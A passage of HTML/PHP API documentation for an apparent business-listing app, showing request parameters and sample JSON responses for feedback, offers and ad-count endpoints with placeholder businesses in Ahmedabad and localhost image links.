                                <thead valign="bottom">
                                <tr class="row-odd">
                                    <th class="head">Param</th>
                                    <th class="head">Required/Optional</th>
                                    <th class="head">Description</th>
                                </tr>
                                </thead>
                                <tbody valign="top">
                                <tr class="row-even">
                                    <td>userid </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>lat </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>lng </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                 <tr class="row-even">
                                    <td>cityID</td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <h5>Response</h5>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Success
                        </h6>
                        <div class="highlight-js json">
                            <div id="json">
                                <div class="collapser"></div>
                                {<span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">data</span>:
                                            <div class="collapser"></div>
                                            {<span class="ellipsis"></span>
                                            <ul class="obj collapsible">
                                                <li>
                                                    <div class="hoverable">
                                                        <span class="property">business</span>:
                                                        <div class="collapser"></div>
                                                        [<span class="ellipsis"></span>
                                                        <ul class="array collapsible">
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Meetups"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/1.jpg">http://localhost/apps/businessapp/uploads/business/1.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable hovered">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"2"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-2"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Business"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/2.jpg">http://localhost/apps/businessapp/uploads/business/2.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"3"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-3"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Music"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/3.jpg">http://localhost/apps/businessapp/uploads/business/3.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"4"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-4"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Dance"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/4.jpg">http://localhost/apps/businessapp/uploads/business/4.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"5"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-5"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Workshop"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: [ ]</div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"6"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-6"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Arts"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: [ ]</div>
                                                                        </li>
                                                                    </ul>
                                                                    }
                                                                </div>
                                                            </li>
                                                        </ul>
                                                        ]
                                                    </div>
                                                </li>
                                            </ul>
                                            }
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                        </h6>
                        <div class="highlight-js json">
                            <div class="collapser"></div>
                            {
                            <span class="ellipsis"></span>
                            <ul class="obj collapsible">
                                <li>
                                    <div class="hoverable">
                                        <span class="property">code</span>:
                                        <span class="type-number">400</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">status</span>:
                                        <span class="type-string">"error"</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">message</span>:
                                        <span class="type-string">"Bad Request"</span>
                                    </div>
                                </li>
                            </ul>
                            }
                        </div>
                    </div>
                    <div class="section" id="feedbacks">
                        <div class="section" id="feedbacks">
                            <h2>Feedbacks
                                <a class="headerlink" href="feedbacks.php#feedbacks" title="Permalink to this headline">¶</a>
                                <a href="<?php echo $formpath.'feedbacks.php'?>" target="_blank" class="html_link">HTML Form</a>
                            </h2>
                            <p>Feedbacks</p>
                            <h5>API LINK</h5>
                            <div class="highlight-text">
                                <div class="highlight">
                                    <pre><?php echo $apipath.'/feedback/get';?></pre>
                                </div>
                            </div>
                            <h5>Request Parameters</h5>
                            <div class="wy-table-responsive">
                                <table border="1" class="docutils">
                                    <colgroup>
                                        <col width="35%">
                                        <col width="30%">
                                        <col width="">
                                    </colgroup>
                                    <thead valign="bottom">
                                    <tr class="row-odd">
                                        <th class="head">Param</th>
                                        <th class="head">Required/Optional</th>
                                        <th class="head">Description</th>
                                    </tr>
                                    </thead>
                                    <tbody valign="top">
                                    <tr class="row-even">
                                        <td>userid </td>
                                        <td>Required</td>
                                        <td></td>
                                    </tr>
                                    <tr class="row-even">
                                        <td>start </td>
                                        <td>Required</td>
                                        <td></td>
                                    </tr>
                                    <tr class="row-even">
                                        <td>limit </td>
                                        <td>Required</td>
                                        <td></td>
                                    </tr>
                                      <tr class="row-even">
                                        <td>cityID</td>
                                        <td>Optional</td>
                                        <td></td>
                                     </tr>
                                    </tbody>
                                </table>
                            </div>
                            <h5>Response</h5>
                            <h6>
                                <i class="fa fa-hand-o-right"></i> Success
                            </h6>
                            <div class="highlight-js json">
                                <div id="json">
                                    <div class="collapser"></div>
                                    {<span class="ellipsis"></span>
                                    <ul class="obj collapsible">
                                        <li>
                                            <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                        </li>
                                        <li>
                                            <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                        </li>
                                        <li>
                                            <div class="hoverable">
                                                <span class="property">data</span>:
                                                <div class="collapser"></div>
                                                {<span class="ellipsis"></span>
                                                <ul class="obj collapsible">
                                                    <li>
                                                        <div class="hoverable">
                                                            <span class="property">feedbacks</span>:
                                                            <div class="collapser"></div>
                                                            [<span class="ellipsis"></span>
                                                            <ul class="array collapsible">
                                                                <li>
                                                                    <div class="hoverable">
                                                                        <div class="collapser"></div>
                                                                        {<span class="ellipsis"></span>
                                                                        <ul class="obj collapsible">
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">id</span>: <span class="type-string">"12"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Miralbhai Viroja"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/user/14691723208605.png">http://localhost/apps/businessapp/uploads/user/14691723208605.png</a><span class="type-string">"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">comment</span>: <span class="type-string">"this is test"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">rating</span>: <span class="type-string">"9"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">datetime</span>: <span class="type-string">"2016-09-05 17:52:43"</span></div>
                                                                            </li>
                                                                        </ul>
                                                                        },
                                                                    </div>
                                                                </li>
                                                                <li>
                                                                    <div class="hoverable">
                                                                        <div class="collapser"></div>
                                                                        {<span class="ellipsis"></span>
                                                                        <ul class="obj collapsible">
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">id</span>: <span class="type-string">"11"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable hovered"><span class="property">name</span>: <span class="type-string">"Miralbhai Viroja"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/user/14691723208605.png">http://localhost/apps/businessapp/uploads/user/14691723208605.png</a><span class="type-string">"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">comment</span>: <span class="type-string">"this is test"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">rating</span>: <span class="type-string">"8"</span>,</div>
                                                                            </li>
                                                                            <li>
                                                                                <div class="hoverable"><span class="property">datetime</span>: <span class="type-string">"2016-09-05 17:52:43"</span></div>
                                                                            </li>
                                                                        </ul>
                                                                        }
                                                                    </div>
                                                                </li>
                                                            </ul>
                                                            ],
                                                        </div>
                                                    </li>
                                                    <li>
                                                        <div class="hoverable"><span class="property">islast</span>: <span class="type-string">"n"</span></div>
                                                    </li>
                                                </ul>
                                                }
                                            </div>
                                        </li>
                                    </ul>
                                    }
                                </div>
                            </div>
                            <h6>
                                <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                            </h6>
                            <div class="highlight-js json">
                                <div class="collapser"></div>
                                {
                                <span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">code</span>:
                                            <span class="type-number">400</span>,
                                        </div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">status</span>:
                                            <span class="type-string">"error"</span>,
                                        </div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">message</span>:
                                            <span class="type-string">"Bad Request"</span>
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                    </div>
                      <div class="section" id="offers">
                        <h2>Offers
                            <a class="headerlink" href="index.php#offers" title="Permalink to this headline">¶</a>
                            <a href="<?php echo $formpath.'offers.php'?>" target="_blank" class="html_link">HTML Form</a>
                        </h2>
                        <p>Offers</p>
                        <h5>API LINK</h5>
                        <div class="highlight-text">
                            <div class="highlight">
                                <pre><?php echo $apipath.'/offers/get';?></pre>
                            </div>
                        </div>
                        <h5>Request Parameters</h5>
                        <div class="wy-table-responsive">
                            <table border="1" class="docutils">
                                <colgroup>
                                    <col width="35%">
                                    <col width="30%">
                                    <col width="">
                                </colgroup>
                                <thead valign="bottom">
                                <tr class="row-odd">
                                    <th class="head">Param</th>
                                    <th class="head">Required/Optional</th>
                                    <th class="head">Description</th>
                                </tr>
                                </thead>
                                <tbody valign="top">
                                <tr class="row-even">
                                    <td>userid </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>start </td>
                                    <td>optional</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>limit </td>
                                    <td>optional</td>
                                    <td></td>
                                </tr>
                                 <tr class="row-even">
                                    <td>cityID</td>
                                    <td>Optional</td>
                                    <td></td>
                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <h5>Response</h5>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Success
                        </h6>
                        <div class="highlight-js json">
                            <div id="json">
                                <div class="collapser"></div>
                                {<span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">data</span>:
                                            <div class="collapser"></div>
                                            {<span class="ellipsis"></span>
                                            <ul class="obj collapsible">
                                                <li>
                                                    <div class="hoverable">
                                                        <span class="property">business</span>:
                                                        <div class="collapser"></div>
                                                        [<span class="ellipsis"></span>
                                                        <ul class="array collapsible">
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Meetups"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/1.jpg">http://localhost/apps/businessapp/uploads/business/1.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable hovered">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"2"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-2"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Business"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/2.jpg">http://localhost/apps/businessapp/uploads/business/2.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"3"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-3"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Music"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/3.jpg">http://localhost/apps/businessapp/uploads/business/3.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"4"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-4"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Dance"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/4.jpg">http://localhost/apps/businessapp/uploads/business/4.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"5"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-5"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Workshop"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: [ ]</div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"6"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-6"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Arts"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: [ ]</div>
                                                                        </li>
                                                                    </ul>
                                                                    }
                                                                </div>
                                                            </li>
                                                        </ul>
                                                        ]
                                                    </div>
                                                </li>
                                            </ul>
                                            }
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                        </h6>
                        <div class="highlight-js json">
                            <div class="collapser"></div>
                            {
                            <span class="ellipsis"></span>
                            <ul class="obj collapsible">
                                <li>
                                    <div class="hoverable">
                                        <span class="property">code</span>:
                                        <span class="type-number">400</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">status</span>:
                                        <span class="type-string">"error"</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">message</span>:
                                        <span class="type-string">"Bad Request"</span>
                                    </div>
                                </li>
                            </ul>
                            }
                        </div>
                    </div>
                     <div class="section" id="countads">
                        <h2>Offers
                            <a class="headerlink" href="index.php#countads" title="Permalink to this headline">¶</a>
                            <a href="<?php echo $formpath.'countappevent.php'?>" target="_blank" class="html_link">HTML Form</a>
                        </h2>
                        <p>countads</p>
                        <h5>API LINK</h5>
                        <div class="highlight-text">
                            <div class="highlight">
                                <pre><?php echo $apipath.'/countads/add';?></pre>
                            </div>
                        </div>
                        <h5>Request Parameters</h5>
                        <div class="wy-table-responsive">
                            <table border="1" class="docutils">
                                <colgroup>
                                    <col width="35%">
                                    <col width="30%">
                                    <col width="">
                                </colgroup>
                                <thead valign="bottom">
                                <tr class="row-odd">
                                    <th class="head">Param</th>
                                    <th class="head">Required/Optional</th>
                                    <th class="head">Description</th>
                                </tr>
                                </thead>
                                <tbody valign="top">
                                <tr class="row-even">
                                    <td>userid </td>
                                    <td>Required</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>type </td>
                                    <td>required</td>
                                    <td> 1=Click 2=Impression 3=QR Reader</td>
                                </tr>
                                <tr class="row-even">
                                    <td>ad_id </td>
                                    <td>optional</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>offer_id</td>
                                    <td>optional</td>
                                    <td></td>
                                </tr>
                                <tr class="row-even">
                                    <td>business_id</td>
                                    <td>optional</td>
                                    <td></td>
                                </tr> 
                                 
                                </tbody>
                            </table>
                        </div>
                        <h5>Response</h5>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Success
                        </h6>
                        <div class="highlight-js json">
                            <div id="json">
                                <div class="collapser"></div>
                                {<span class="ellipsis"></span>
                                <ul class="obj collapsible">
                                    <li>
                                        <div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div>
                                    </li>
                                    <li>
                                        <div class="hoverable">
                                            <span class="property">data</span>:
                                            <div class="collapser"></div>
                                            {<span class="ellipsis"></span>
                                            <ul class="obj collapsible">
                                                <li>
                                                    <div class="hoverable">
                                                        <span class="property">business</span>:
                                                        <div class="collapser"></div>
                                                        [<span class="ellipsis"></span>
                                                        <ul class="array collapsible">
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-1"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
